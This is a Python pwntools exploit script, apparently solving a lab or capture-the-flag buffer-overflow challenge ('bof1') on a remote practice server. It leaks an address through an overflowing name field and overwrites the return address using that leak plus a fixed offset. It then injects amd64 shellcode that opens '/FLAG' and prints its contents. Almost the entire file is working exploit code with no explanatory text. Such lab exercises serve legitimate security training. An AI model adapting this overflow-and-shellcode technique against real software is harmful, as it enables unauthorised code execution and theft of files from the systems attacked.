#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = '../spec/bof1'
port = 12342

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
    # print("pid:", r.pid)
    # pause()
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)

asm_code = """
xor rax, rax
push rax
mov rbx, 0x47414c46
push rbx
mov byte ptr [rsp-1], 0x2f
lea rdi, [rsp-1]
xor rsi, rsi
mov rax, 2
syscall

mov r8, rax
add rsp, 24

sub rsp, 0x100
mov rsi, rsp
mov rdi, r8
mov rdx, 49
xor rax, rax
syscall

mov rdi, 1
mov rax, 1
syscall

xor rdi, rdi
mov rax, 60
syscall
"""
sc = asm(asm_code, arch='amd64')

r.sendafter(b"name? ", b'A' * (8*7))
r.sendafter(b"number? ", b'A' * (8*13) + 
    ((int.from_bytes(r.recvline()[9+8*7 : -1], byteorder='little')) + 0xe5587).to_bytes(6, byteorder='little'))
r.sendafter(b"name? ", b"Test")
r.sendafter(b"message: ", sc)
r.recvuntil(b'you!\n')

print(r.recv())
r.close()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :

